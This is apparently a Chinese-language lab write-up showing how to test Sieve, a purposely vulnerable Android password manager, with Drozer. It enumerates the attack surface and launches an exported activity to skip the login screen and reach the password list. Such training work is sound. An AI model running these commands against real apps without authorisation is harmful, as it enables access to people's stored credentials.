---
title: Test Sieve - activities exported
tags: [Android, Drozer]

---

* Drozer Seive - [官網](https://labs.withsecure.com/tools/drozer#3.1), [Download](https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/sieve.apk)
    > Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.
    
# Test Sieve - activities exported
參考[^csdn-sieve-1][^hacktricks-diva-sieve]，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞
1. 起手式-確認基本資訊
    ```bash!
    dz> run app.package.list -f Sieve # 確認該App的package name
    Attempting to run shell module
    com.mwr.example.sieve (Sieve)
    
    dz> run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊
    Attempting to run shell module
    Package: com.mwr.example.sieve
      Application Label: Sieve
      Process Name: com.mwr.example.sieve
      Version: 1.0
      Data Directory: /data/user/0/com.mwr.example.sieve
      APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk
      UID: 10285
      GID: [3003]
      Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar]
      Shared User ID: null
      Uses Permissions:
      - android.permission.READ_EXTERNAL_STORAGE
      - android.permission.WRITE_EXTERNAL_STORAGE
      - android.permission.INTERNET
      - android.permission.POST_NOTIFICATIONS
      - android.permission.ACCESS_MEDIA_LOCATION
      - android.permission.READ_MEDIA_AUDIO
      - android.permission.READ_MEDIA_VIDEO
      - android.permission.READ_MEDIA_IMAGES
      Defines Permissions:
      - com.mwr.example.sieve.READ_KEYS
      - com.mwr.example.sieve.WRITE_KEYS
      
    dz> run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示
    ...
    
    dz> run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些
    Attempting to run shell module
    Attack Surface:
      3 activities exported
      0 broadcast receivers exported
      2 content providers exported
      2 services exported
        is debuggable
    ```
    看攻擊面的左邊就是該攻擊點有幾個
2. activities exported
    1. 列出exported activities有哪些
        ```bash
        dz> run app.activity.info -a com.mwr.example.sieve
        Attempting to run shell module
        Package: com.mwr.example.sieve
          com.mwr.example.sieve.FileSelectActivity
            Permission: null
          com.mwr.example.sieve.MainLoginActivity
            Permission: null
          com.mwr.example.sieve.PWList
            Permission: null
        ```
    2. 啟動activity
        ```bash
        dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
        ```
        此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass
        ![Screenshot_20240603-163856](https://hackmd.io/_uploads/rkrr-ZsNA.png =200x)
# Reference
[^csdn-sieve-1]:[drozer之玩轉sieve](https://blog.csdn.net/samlirongsheng/article/details/104926282)
[^hacktricks-diva-sieve]:[Drozer Tutorial](https://book.hacktricks.xyz/v/cn/mobile-pentesting/android-app-pentesting/drozer-tutorial)